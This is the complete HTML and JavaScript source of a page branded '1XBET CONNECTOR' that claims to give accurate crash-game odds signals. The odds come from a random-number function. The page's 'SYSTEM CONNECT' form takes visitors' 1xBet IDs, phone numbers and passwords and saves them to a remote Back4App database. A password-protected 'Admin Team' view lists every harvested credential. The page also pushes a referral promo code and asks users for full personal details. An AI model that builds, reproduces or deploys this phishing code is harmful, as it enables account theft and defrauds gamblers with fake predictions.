<!DOCTYPE html>
<html lang="si">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
  <meta name="theme-color" content="#0a0f14" />
  <title>CRASH Next Odd – 1XBET CONNECTOR</title>
  
  <!-- Add Back4App Parse SDK -->
  <script src="https://npmcdn.com/parse/dist/parse.min.js"></script>

  <style>
    :root{
      --bg:#0a0f14; --bg2:#0d141c; --card:#0e141b; --text:#e9eef6; --muted:#9aa6b2;
      --orange:#ff6a00; --orange2:#ff9330; --betBlue:#2aa4ff;
      --ring-blur:10px;
      --padL:max(12px, env(safe-area-inset-left));
      --padR:max(12px, env(safe-area-inset-right));
      --padB:max(14px, env(safe-area-inset-bottom));
      --padT:max(8px, env(safe-area-inset-top));
      --gold:#ffd860; --goldGlow:rgba(255,216,96,0.55);
      --tg1:#29a9ea; --tg2:#1d8cd2; --tgRGB:41,169,234;
    }
    *{box-sizing:border-box}
    html,body{height:100%;margin:0}
    body{
      font-family: system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
      color:var(--text);
      background:
        radial-gradient(1200px 800px at 10% -10%,#111b24 0%,transparent 60%),
        radial-gradient(900px 600px at 120% 110%,#0d1720 0%,transparent 55%),
        var(--bg);
    }

    /* App layout */
    #app{position:fixed; inset:0; display:none;
      grid-template-rows:auto 1fr; gap:8px;
      padding:var(--padT) var(--padR) var(--padB) var(--padL);
    }
    #app.show{display:grid; animation:fadeIn .3s ease-out}
    @keyframes fadeIn{from{opacity:0; transform:translateY(6px)} to{opacity:1; transform:none}}

    /* Topbar and Admin Button */
    .topbar{display:flex; align-items:center; justify-content:center; padding-top:2px; position:relative; overflow:hidden}
    #btnAdmin{
      position:absolute; top:4px; right:0;
      background:rgba(42,164,255,.1); border:1px solid rgba(42,164,255,.3);
      color:var(--betBlue); font-size:11px; font-weight:700;
      padding:6px 10px; border-radius:8px; cursor:pointer;
      text-transform:uppercase; letter-spacing:0.5px;
      transition: background .2s;
    }
    #btnAdmin:hover{background:rgba(42,164,255,.2);}

    /* Animated brand: 1XBET */
    .brandX{
      display:inline-flex; align-items:baseline; gap:8px;
      font-weight:900; letter-spacing:.5px;
      text-shadow:0 2px 12px rgba(0,0,0,.35);
      user-select:none;
      transform:translateY(-8px); opacity:0; filter:blur(6px);
      animation: brandIntro .9s cubic-bezier(.2,.9,.2,1) .2s forwards;
    }
    .brandX .b1{ color:#ffffff; font-size:28px; }
    .brandX .b2{ color:var(--betBlue); font-size:28px; }
    .brandX .glint{
      position:absolute; top:0; left:-20%; width:16%; height:100%;
      background:linear-gradient(90deg, transparent, rgba(255,255,255,.5), transparent);
      transform:skewX(-20deg);
      animation: glint 2.1s ease-in-out .4s 1;
      pointer-events:none;
      filter:blur(.4px);
    }
    @keyframes brandIntro{
      to{ transform:translateY(0); opacity:1; filter:blur(0); }
    }
    @keyframes glint{
      from{ left:-20%; } to{ left:120%; }
    }

    /* Panel */
    .panel{position:relative; overflow:hidden; width:100%; height:100%; background:var(--card)}
    #hackBg{position:absolute; inset:0; z-index:0; background:#050a0c; filter:saturate(1.15) contrast(1.08)}
    .panel::before{
      content:""; position:absolute; inset:0; z-index:1;
      background:
        linear-gradient(180deg, rgba(0,0,0,.55) 0%, rgba(0,0,0,.45) 60%, rgba(255,106,0,.08) 100%),
        repeating-linear-gradient(to bottom, rgba(0,255,153,.06) 0 2px, transparent 2px 4px);
      pointer-events:none;
    }
    .panel-content{position:relative; z-index:2; height:100%; padding:12px; display:grid; gap:12px; grid-auto-rows:max-content; overflow-y:auto}

    /* Connect & Forms */
    .connect{background:rgba(42,164,255,.06); border:1px solid rgba(42,164,255,.22); border-radius:14px; padding:12px; display:grid; gap:10px; backdrop-filter:blur(2px)}
    .connect-title{font-weight:900; font-size:13.5px; letter-spacing:.35px; color:#2aa4ff}
    .form-grid{display:grid; gap:10px}
    label{font-size:12.5px; color:#c8d3df; margin-bottom:2px; display:block}
    .input{width:100%; padding:12px; border-radius:12px; color:#eaf2ff; background:rgba(255,255,255,.04); border:1px solid rgba(255,255,255,.12); outline:none; transition:border-color .2s, box-shadow .2s}
    .input::placeholder{color:#93a7bd}
    .input:focus{border-color:#2aa4ff; box-shadow:0 0 0 3px rgba(42,164,255,.18)}
    .alert{display:none; border-radius:12px; padding:10px 12px; font-weight:800; letter-spacing:.3px; font-size:13px; text-align:center}
    .alert.show{display:block; animation:fadeIn .25s ease-out}
    .alert-success{color:#fff; background:linear-gradient(180deg,#22c55e,#16a34a); border:1px solid #34d399; box-shadow:0 0 0 3px rgba(34,197,94,.18), 0 10px 20px rgba(22,163,74,.35); text-shadow:0 0 10px rgba(34,197,94,.35)}
    .alert-danger{color:#fff; background:linear-gradient(180deg,#ff3b30,#c81e1e); border:1px solid #ff4d4f; box-shadow:0 0 0 3px rgba(255,59,48,.22), 0 10px 24px rgba(200,30,30,.35); text-shadow:0 0 10px rgba(255,59,48,.45)}

    /* Buttons */
    .controls{display:grid; gap:10px}
    .hint{font-size:12.5px; color:#cfd8e3; text-align:center; opacity:.95}
    button, a.btn{
      width:100%; appearance:none; border:none; outline:none; cursor:pointer;
      padding:14px; border-radius:14px; color:#fff; font-weight:900; letter-spacing:.3px; font-size:16px;
      text-align:center; text-decoration:none;
      background:linear-gradient(180deg,#ff7a1c,#ff5c00);
      box-shadow:0 8px 22px rgba(255,106,0,.25), inset 0 1px 0 rgba(255,255,255,.12);
      transition:transform .06s, box-shadow .2s, filter .2s;
      display:inline-flex; align-items:center; justify-content:center; gap:8px;
    }
    button:active, a.btn:active{transform:translateY(1px)}
    button:disabled{opacity:.6; cursor:not-allowed; filter:grayscale(.1); box-shadow:none}
    .btn-yt{background:linear-gradient(180deg,#ff3d3d,#e11d1d); box-shadow:0 8px 22px rgba(225,29,29,.35), inset 0 1px 0 rgba(255,255,255,.12)}
    .btn-bet{background:linear-gradient(180deg,#2aa4ff,#1e90ff); box-shadow:0 8px 22px rgba(42,164,255,.25), inset 0 1px 0 rgba(255,255,255,.12)}
    .btn-tg{
      background:linear-gradient(90deg,var(--tg1),var(--tg2),var(--tg1)); background-size:200% 100%;
      box-shadow:0 8px 22px rgba(var(--tgRGB),.32), inset 0 1px 0 rgba(255,255,255,.12);
      position:relative; overflow:hidden;
      animation:slideBg 3s linear infinite, glowPulse 2.2s ease-in-out infinite;
    }
    .btn-tg::before{
      content:""; position:absolute; top:0; bottom:0; left:-40%; width:40%; transform:skewX(-20deg);
      background:linear-gradient(90deg,rgba(255,255,255,0),rgba(255,255,255,.35),rgba(255,255,255,0));
      animation:shine 2.8s ease-in-out infinite; pointer-events:none;
    }
    @keyframes slideBg{0%{background-position:0 0}100%{background-position:-200% 0}}
    @keyframes glowPulse{0%,100%{box-shadow:0 0 0 0 rgba(var(--tgRGB),.25),0 8px 22px rgba(var(--tgRGB),.32)}50%{box-shadow:0 0 0 6px rgba(var(--tgRGB),.12),0 10px 26px rgba(var(--tgRGB),.45)}}
    @keyframes shine{0%{left:-40%}55%{left:140%}100%{left:140%}}

    /* Other styles... (special, mandatory, odds, etc.) */
    .special{background:rgba(255,106,0,.07); border:1px solid rgba(255,106,0,.25); border-radius:14px; padding:12px; backdrop-filter:blur(2px)}
    .special-title{font-weight:800; font-size:13px; letter-spacing:.3px; color:var(--orange2); margin-bottom:6px}
    .special-body{font-size:12.8px; color:#dbe4ee; line-height:1.5}
    .badge{display:inline-block; padding:2px 8px; border-radius:999px; background:linear-gradient(180deg,#ff7a1c,#ff5c00); color:#fff; font-weight:900; font-size:12px; letter-spacing:.5px; box-shadow:0 4px 12px rgba(255,106,0,.25)}
    .mandatory{margin-top:10px; padding:10px 12px; border-radius:10px; color:#fff; background:linear-gradient(180deg,#ff3b30,#c81e1e); border:1px solid #ff4d4f; box-shadow:0 0 0 3px rgba(255,59,48,.16), 0 10px 22px rgba(200,30,30,.35); font-weight:800; font-size:13px; letter-spacing:.3px;}
    .odd-display{text-align:center}
    #oddValue{font-size:72px; font-weight:900; letter-spacing:1px; color:var(--gold); text-shadow:0 0 16px var(--goldGlow), 0 2px 0 rgba(0,0,0,.25); margin:6px 0 0}
    .pop{animation:pop .45s cubic-bezier(.22,1.14,.38,1)}
    @keyframes pop{0%{transform:scale(.9); filter:brightness(1.1)}60%{transform:scale(1.06)}100%{transform:scale(1)}}
    .analysisline{position:relative; height:56px; display:none; margin-top:2px; filter: drop-shadow(0 0 8px var(--goldGlow)); --analysis-dur: 7s;}
    .analysisline.show{ display:block; animation: fadeIn .2s ease-out; }
    .analysisline .grid{position:absolute; inset:0; background: repeating-linear-gradient(to right, rgba(255,216,96,0.08) 0 1px, transparent 1px 10px); opacity:.7;}
    .analysisline .line{position:absolute; left:0; right:0; top:50%; height:2px; transform:translateY(-50%); background: linear-gradient(90deg, transparent, rgba(255,216,96,.65), transparent); box-shadow: 0 0 14px rgba(255,216,96,.45);}
    .analysisline .sweep{position:absolute; top:50%; transform:translateY(-50%); left:-20%; width:18%; height:3px; border-radius:2px; background: linear-gradient(90deg, rgba(255,216,96,0), rgba(255,216,96,.95), rgba(255,216,96,0)); box-shadow: 0 0 12px rgba(255,216,96,.45); animation: sweepX 1.4s linear infinite;}
    @keyframes sweepX{ from{ left:-20%; } to{ left:120%; } }
    .analysisline .plane{position:absolute; top:50%; left:-10%; transform: translate(-50%, -50%) rotate(-2deg); font-size:20px; color:#ffd860; text-shadow: 0 0 10px rgba(255,216,96,.6); opacity:.95;}
    .analysisline .plane.run{animation: planeX var(--analysis-dur) linear 1 both;}
    @keyframes planeX{ from{ left:-10%; } to  { left:110%; } }
    .countdown{display:grid; place-items:center}
    .cd-wrap{position:relative; width:120px; height:120px}
    .cd-ring{--p:0; position:absolute; inset:0; border-radius:50%; background:conic-gradient(var(--orange) calc(var(--p) * 1turn), rgba(255,255,255,.08) 0); filter:drop-shadow(0 0 10px rgba(255,106,0,.35)); display:grid; place-items:center;}
    .cd-ring::after{content:""; width:92px; height:92px; border-radius:50%; background:rgba(10,15,20,.85); box-shadow:inset 0 0 0 2px rgba(255,255,255,.05); backdrop-filter:blur(2px)}
    .cd-number{position:absolute; inset:0; display:grid; place-items:center; font-weight:800; font-size:32px; letter-spacing:.5px; color:#eafff6; text-shadow:0 0 10px rgba(0,255,153,.45)}
    .history{margin-top:6px; background:rgba(255,255,255,.03); border:1px solid rgba(255,255,255,.08); border-radius:12px; padding:10px}
    .history-title{font-size:12.5px; color:#c8d3df; margin-bottom:8px; font-weight:800; letter-spacing:.3px}
    .history-list{display:flex; flex-wrap:wrap; gap:8px}
    .chip{padding:6px 10px; border-radius:999px; background:linear-gradient(180deg,#101820,#0c141c); border:1px solid rgba(255,255,255,.08); color:var(--gold); font-weight:900; font-size:13px; letter-spacing:.3px; text-shadow:0 0 10px var(--goldGlow)}

    /* Splash */
    #splash{position:fixed; inset:0; display:grid; place-items:center; gap:18px; padding:40px 24px; transition:opacity .6s ease, transform .6s ease;
      background:
        radial-gradient(1200px 800px at 10% -10%,#111b24 0%,transparent 60%),
        radial-gradient(900px 600px at 120% 110%,#0d1720 0%,transparent 55%),
        var(--bg);}
    #splash.hide{opacity:0; transform:translateY(-8px); pointer-events:none}
    .logo-wrap{display:grid; place-items:center}
    .ring{position:relative; width:190px; height:190px; border-radius:50%; display:grid; place-items:center; isolation:isolate}
    .ring::before{content:""; position:absolute; inset:-12px; border-radius:50%; background:conic-gradient(from 0deg, rgba(255,106,0,0) 0deg, rgba(255,106,0,0) 320deg, rgba(255,185,120,1) 360deg); -webkit-mask:radial-gradient(farthest-side, transparent calc(100% - 16px), #000 calc(100% - 14px)); mask:radial-gradient(farthest-side, transparent calc(100% - 16px), #000 calc(100% - 14px)); animation:ringSweep 2.2s linear infinite; filter:drop-shadow(0 0 var(--ring-blur) rgba(255,106,0,.8))}
    .ring::after{content:""; position:absolute; inset:0; border-radius:50%; box-shadow:inset 0 0 0 2px rgba(255,106,0,.45), inset 0 0 25px rgba(255,106,0,.35)}
    @keyframes ringSweep{to{transform:rotate(1turn)}}
    .logo{width:160px; height:160px; border-radius:50%; display:grid; place-items:center; background:radial-gradient(140px 140px at 50% 45%, rgba(255,106,0,.25), transparent 60%); box-shadow:inset 0 0 0 1px rgba(255,255,255,.06)}
    .logo .plane{font-size:44px; color:var(--orange); text-shadow:0 0 14px rgba(255,106,0,.5)}
    .brand-splash{margin-top:6px; font-weight:800; letter-spacing:2px; font-size:16px; color:var(--orange2); text-shadow:0 0 8px rgba(255,106,0,.35)}
    .splash-text{font-size:14px; color:var(--muted)}

    /* Admin Panel Styles */
    #adminPanel{
      position:fixed; inset:0; display:none; flex-direction:column;
      background:var(--bg);
      padding:var(--padT) var(--padR) var(--padB) var(--padL);
      gap: 16px;
    }
    .admin-header{
      display:flex; justify-content:space-between; align-items:center;
      padding-bottom:10px; border-bottom:1px solid rgba(255,255,255,.1);
    }
    .admin-header h2{margin:0; font-size:20px; color:var(--betBlue);}
    #adminPanel table{
      width:100%; border-collapse:collapse;
      table-layout: fixed;
    }
    #adminPanel th, #adminPanel td{
      border:1px solid rgba(255,255,255,.15);
      padding:10px; text-align:left; font-size:13px;
      word-wrap: break-word;
    }
    #adminPanel th{ background-color:rgba(42,164,255,.1); font-weight:bold; }
    .admin-table-wrapper{flex-grow:1; overflow-y:auto;}

    @media (prefers-reduced-motion: reduce){
      .ring::before{animation:none}
      .pop{animation:none}
      .btn-tg{animation:none} .btn-tg::before{display:none}
      .analysisline .sweep{animation:none}
      .analysisline .plane.run{animation:none}
    }
  </style>
</head>
<body>

  <!-- Splash -->
  <div id="splash">
    <div class="logo-wrap">
      <div class="ring">
        <div class="logo">
          <div class="plane">✈</div>
          <div class="brand-splash">CRASH</div>
        </div>
      </div>
    </div>
    <div class="splash-text">Loading…</div>
  </div>

  <!-- App -->
  <main id="app" aria-live="polite">
    <div class="topbar">
      <div class="brandX" id="brandX">
        <span class="b1">1X</span><span class="b2">BET</span>
        <!-- The glint span that was causing the white line has been removed from here -->
      </div>
      <button id="btnAdmin">Admin Team</button>
    </div>

    <div id="panel" class="panel">
      <canvas id="hackBg"></canvas>

      <div class="panel-content">
        <!-- 1XBET SYSTEM CONNECT -->
        <div class="connect">
          <div class="connect-title">1XBET SYSTEM CONNECT</div>
          <a class="btn btn-yt" href="https://youtu.be/IhUVA07olYo?si=kMF-g_xoPpUq8BQ-" target="_blank" rel="noopener noreferrer">
            <svg class="icon" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="11" fill="#ff0000"/><path d="M10 8l6 4-6 4z" fill="#fff"/></svg>
            How To Registration
          </a>
          <div class="form-grid">
            <div>
              <label for="xbId">your 1xbet id</label>
              <input id="xbId" class="input" placeholder="Enter your 1xbet ID" inputmode="numeric" autocomplete="off" />
            </div>
            <div>
              <label for="xbPhone">phone number</label>
              <input id="xbPhone" class="input" type="tel" placeholder="Enter phone number" inputmode="tel" autocomplete="tel" pattern="[0-9+()\\- ]{6,}" />
            </div>
            <div>
              <label for="xbPass">password</label>
              <input id="xbPass" class="input" type="password" placeholder="Enter password" autocomplete="off" />
            </div>
            <button id="btnConnect" class="btn-bet">SYSTEM CONNECT</button>
            <div id="connectMsg" class="alert" role="status" aria-live="polite"></div>
            <a id="btnTg" class="btn btn-tg" href="https://t.me/nishanservice" target="_blank" rel="noopener noreferrer">
              <svg class="icon" width="18" height="18" viewBox="0 0 24 24" aria-hidden="true"><path fill="#fff" d="M2 3l20 9-20 9 3-7 9-2-9-2z"/></svg>
              contact system manneger
            </a>
          </div>
        </div>
        <!-- Special note, Odds, Countdown, etc... -->
        <div class="special">
          <div class="special-title">විශේෂ උපදෙස්</div>
          <div class="special-body">
            99.9% ක් නිවැරදි signal ලබා ගත හැක්කේ <span class="badge">VIPCNA</span> Promo Code යොදා නිර්මාණය කර ඇති ගිණුම් සඳහා පමණයි / හේතුව :- එම කෝඩ් එකෙන් තියෙන හැම 1xbet account එකකම එකම Crash චාට් පැටන් odd generate වීම හා එම කෝඩ් එකට අදාල 1xbet account වලට Signal Generate වීම ...
          </div>
          <div class="mandatory">
            අනිවාර්යයයි :- Promo Code ( VIPCNA ) කෝඩ් එකෙන් අලුත් 1xbet ගිණුමක් සෑදීම සහා personal imformation  සම්පුර්ණයෙන් fill කිරීම .
          </div>
        </div>
        <div class="odd-display"><div id="oddValue">00.00X</div></div>
        <div id="analysisLine" class="analysisline" aria-hidden="true">
          <div class="grid"></div><div class="line"></div><div class="sweep"></div><div id="analysisPlane" class="plane">✈</div>
        </div>
        <div class="countdown">
          <div id="cdWrap" class="cd-wrap">
            <div id="cdRing" class="cd-ring" style="--p:0;"></div>
            <div id="cdNum" class="cd-number">7</div>
          </div>
        </div>
        <div class="controls">
          <button id="btnNext">Next Odd</button>
          <div class="hint">( සෑම odd එකක් ආරම්භයේදීම next odd බටන් එක clik කිරීමෙන් පසුව ඊලග odd එක ලබා ගත හැක )</div>
        </div>
        <div class="history">
          <div class="history-title">Odd History (අවසන් 10)</div>
          <div id="histList" class="history-list"></div>
        </div>
      </div>
    </div>
  </main>

  <!-- Admin Panel -->
  <div id="adminPanel">
    <div class="admin-header">
      <h2>Admin Team - User Data</h2>
      <button id="btnBackToApp" class="btn-bet" style="padding: 8px 16px; font-size: 14px;">Back to App</button>
    </div>
    <div class="admin-table-wrapper">
      <table>
        <thead>
          <tr>
            <th style="width: 8%;">#</th>
            <th style="width: 25%;">1xBet ID</th>
            <th style="width: 32%;">Phone Number</th>
            <th style="width: 35%;">Password</th>
          </tr>
        </thead>
        <tbody id="userDataBody">
          <!-- User data will be inserted here -->
        </tbody>
      </table>
    </div>
  </div>


  <script>
    // --- Initialize Back4App (Parse) ---
    const PARSE_APP_ID = 'fSKqF8C6kY9KO06Wc2jrM0gxNiAXnRj2KnAmaNX7';
    const PARSE_JS_KEY = 'SW5G9GMbq4Wd2bpG4kbBMModtI9laHm6FkO3CSmb';
    Parse.initialize(PARSE_APP_ID, PARSE_JS_KEY);
    Parse.serverURL = 'https://parseapi.back4app.com';
    // --- End of Initialization ---

    // Elements
    const splash = document.getElementById('splash');
    const app = document.getElementById('app');
    const panel = document.getElementById('panel');
    const hackCanvas = document.getElementById('hackBg');
    const hctx = hackCanvas.getContext('2d');
    const idInput = document.getElementById('xbId');
    const phoneInput = document.getElementById('xbPhone');
    const passInput = document.getElementById('xbPass');
    const connectBtn = document.getElementById('btnConnect');
    const connectMsg = document.getElementById('connectMsg');
    const btn = document.getElementById('btnNext');
    const oddValue = document.getElementById('oddValue');
    const cdNum = document.getElementById('cdNum');
    const cdRing = document.getElementById('cdRing');
    const analysisLine = document.getElementById('analysisLine');
    const analysisPlane = document.getElementById('analysisPlane');
    const histList = document.getElementById('histList');
    const historyData = [];
    const brandX = document.getElementById('brandX');
    const btnAdmin = document.getElementById('btnAdmin');
    const adminPanel = document.getElementById('adminPanel');
    const btnBackToApp = document.getElementById('btnBackToApp');
    const userDataBody = document.getElementById('userDataBody');
    const ADMIN_PASSWORD = '522622';
    
    // State
    let timer = null, triedFS = false, scrambleInterval = null;

    // App Visibility
    let appShown = false;
    function showApp(){
      if (appShown) return; appShown = true;
      splash.classList.add('hide');
      setTimeout(()=>{
        app.style.display = 'grid';
        app.classList.add('show');
        initHackBg(); animateHackBg();
        // Since the glint element is removed, this part of the original code is no longer necessary but is harmless.
        if (brandX){
          const gl = brandX.querySelector('.glint');
          if (gl){ gl.style.animation='none'; gl.offsetHeight; gl.style.animation=null; }
        }
        updateHistoryDOM();
      }, 350);
    }
    window.addEventListener('load', ()=> setTimeout(showApp, 800));
    document.addEventListener('DOMContentLoaded', ()=> setTimeout(showApp, 1500));

    // Helpers & UI functions (no changes here)
    function tryFullscreen(){ if (triedFS) return; triedFS = true; const el = document.documentElement; const req = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen; if (req){ try{ req.call(el); }catch(e){} } }
    function formatOdd(x){ return Number(x).toFixed(2).padStart(5, '0') + 'X'; }
    function randomOdd(){ return 1.20 + Math.random() * (5.60 - 1.20); }
    function setProgress(p){ cdRing.style.setProperty('--p', Math.max(0, Math.min(1, p))); }
    function showOdd(x){ oddValue.textContent = formatOdd(x); oddValue.classList.remove('pop'); void oddValue.offsetWidth; oddValue.classList.add('pop'); }
    function startAnalysis(seconds){ analysisLine.style.setProperty('--analysis-dur', seconds + 's'); analysisLine.classList.add('show'); analysisPlane.classList.remove('run'); void analysisPlane.offsetWidth; analysisPlane.classList.add('run'); if (scrambleInterval) clearInterval(scrambleInterval); scrambleInterval = setInterval(() => { oddValue.textContent = formatOdd(randomOdd()); }, 110); }
    function stopAnalysis(){ analysisLine.classList.remove('show'); analysisPlane.classList.remove('run'); if (scrambleInterval){ clearInterval(scrambleInterval); scrambleInterval = null; } }
    function addToHistory(x){ historyData.unshift(formatOdd(x)); if (historyData.length>10) historyData.pop(); updateHistoryDOM(); }
    function updateHistoryDOM(){ histList.innerHTML=''; if (!historyData.length){ histList.innerHTML='<div class="chip">—</div>'; return; } historyData.forEach(v=>{ const chip=document.createElement('div'); chip.className='chip'; chip.textContent=v; histList.appendChild(chip); }); }
    function startCountdown(seconds=7){ if (timer) clearInterval(timer); btn.disabled = true; btn.textContent = 'Waiting…'; tryFullscreen(); startAnalysis(seconds); let t = seconds; cdNum.textContent = t; setProgress(0); timer = setInterval(()=>{ t--; setProgress((seconds - t) / seconds); cdNum.textContent = t; if (t<=0){ clearInterval(timer); timer=null; setProgress(1); stopAnalysis(); const odd = randomOdd(); showOdd(odd); addToHistory(odd); btn.disabled = false; btn.textContent = 'Next Odd'; } }, 1000); }
    btn.addEventListener('click', ()=> startCountdown(7));


    // --- REAL-TIME DATABASE LOGIC ---

    // Function to save user data to Back4App
    async function saveUserData(id, phone, password) {
        const user = new Parse.Object("UserData"); // Class name must be "UserData"
        user.set("xbetId", id);
        user.set("phone", phone);
        user.set("password", password);
        
        try {
            await user.save();
            return true; // Success
        } catch (error) {
            console.error('Error while saving user data: ', error);
            return false; // Failure
        }
    }

    // UPDATED Connect Button Logic
    connectBtn.addEventListener('click', async (e) => {
        e.preventDefault();
        tryFullscreen();

        const id = (idInput?.value || '').trim();
        const phone = (phoneInput?.value || '').trim();
        const pw = (passInput?.value || '').trim();

        if (!id && !phone && !pw) {
            connectMsg.textContent = 'Please fill in at least one field.';
            connectMsg.className = 'alert alert-danger show';
            return;
        }

        // Provide user feedback while saving
        connectBtn.disabled = true;
        connectBtn.textContent = 'CONNECTING...';
        connectMsg.className = 'alert';
        connectMsg.textContent = '';

        const isSaved = await saveUserData(id, phone, pw);

        if (!isSaved) {
            // If saving to database failed
            connectMsg.textContent = 'Connection Error. Please try again.';
            connectMsg.className = 'alert alert-danger show';
            connectBtn.disabled = false;
            connectBtn.textContent = 'SYSTEM CONNECT';
            return;
        }

        // If saving to database was successful
        if (pw === 'VIPCNA' && id.length > 0) {
            connectMsg.textContent = '✓ SYSTEM CONNECT SUCCESS';
            connectMsg.classList.add('alert-success', 'show');
            connectBtn.textContent = 'CONNECTED';
            // Button remains disabled on success
        } else {
            connectMsg.textContent = '✗ SYSTEM CONNECT FAIL';
            connectMsg.classList.add('alert-danger', 'show');
            connectBtn.disabled = false; // Re-enable if connection logic fails
            connectBtn.textContent = 'SYSTEM CONNECT';
        }
    });


    // Function to render the user data table from Back4App
    async function renderAdminTable() {
        userDataBody.innerHTML = '<tr><td colspan="4" style="text-align:center;">Loading data...</td></tr>';
        
        const query = new Parse.Query("UserData");
        query.descending("createdAt"); // Show newest users first

        try {
            const users = await query.find();
            userDataBody.innerHTML = ''; // Clear loading message

            if (users.length === 0) {
                userDataBody.innerHTML = '<tr><td colspan="4" style="text-align:center;">No user data found.</td></tr>';
                return;
            }

            users.forEach((user, index) => {
                const row = document.createElement('tr');
                // Use .get() method to retrieve data from Parse Object
                row.innerHTML = `
                    <td>${index + 1}</td>
                    <td>${user.get('xbetId') || 'N/A'}</td>
                    <td>${user.get('phone') || 'N/A'}</td>
                    <td>${user.get('password') || 'N/A'}</td>
                `;
                userDataBody.appendChild(row);
            });

        } catch (error) {
            console.error('Error fetching user data:', error);
            userDataBody.innerHTML = `<tr><td colspan="4" style="text-align:center; color: #ff3b30;">Failed to load data. Check console for errors.</td></tr>`;
        }
    }

    // Admin Panel Logic
    btnAdmin.addEventListener('click', () => {
        const password = prompt('Enter Admin Password:');
        if (password === ADMIN_PASSWORD) {
            app.style.display = 'none';
            adminPanel.style.display = 'flex';
            renderAdminTable(); // Fetch and display real-time data
        } else if (password !== null) {
            alert('Incorrect Password!');
        }
    });

    btnBackToApp.addEventListener('click', () => {
        adminPanel.style.display = 'none';
        app.style.display = 'grid';
    });

    // Hacker matrix background (no changes needed)
    const CHARS=('アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズヅブプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴン'+'0123-56789ABCDEFGHIJKLMNOPQRSTUVWXYZVIPCNA').split('');
    const FONT_SIZE=14;
    let columns=0, drops=[], cssW=0, cssH=0;
    function initHackBg(){ const dpr=Math.min(2, window.devicePixelRatio||1); const rect=panel.getBoundingClientRect(); cssW=Math.max(1, Math.floor(rect.width)); cssH=Math.max(1, Math.floor(rect.height)); hackCanvas.width=Math.floor(cssW*dpr); hackCanvas.height=Math.floor(cssH*dpr); hackCanvas.style.width=cssW+'px'; hackCanvas.style.height=cssH+'px'; hctx.setTransform(dpr,0,0,dpr,0,0); hctx.clearRect(0,0,cssW,cssH); hctx.font=`${FONT_SIZE}px monospace`; hctx.textBaseline='top'; columns=Math.floor(cssW/FONT_SIZE); drops=Array.from({length:columns},()=>Math.floor(Math.random()*-40)); }
    function drawHackFrame(){ hctx.fillStyle='rgba(0,8,10,.15)'; hctx.fillRect(0,0,cssW,cssH); for (let i=0;i<columns;i++){ const char=CHARS[(Math.random()*CHARS.length)|0], x=i*FONT_SIZE, y=drops[i]*FONT_SIZE; hctx.shadowColor='rgba(0,255,153,.35)'; hctx.shadowBlur=8; hctx.fillStyle='rgba(0,255,153,.88)'; hctx.fillText(char,x,y); drops[i]+= (Math.random()<0.06?2:1); if (y>cssH && Math.random()>0.975){ drops[i]=Math.floor(Math.random()*-20); } } }
    let animId=null; function animateHackBg(){ cancelAnimationFrame(animId); const loop=()=>{ drawHackFrame(); animId=requestAnimationFrame(loop) }; loop(); }
  </script>
</body>
</html>
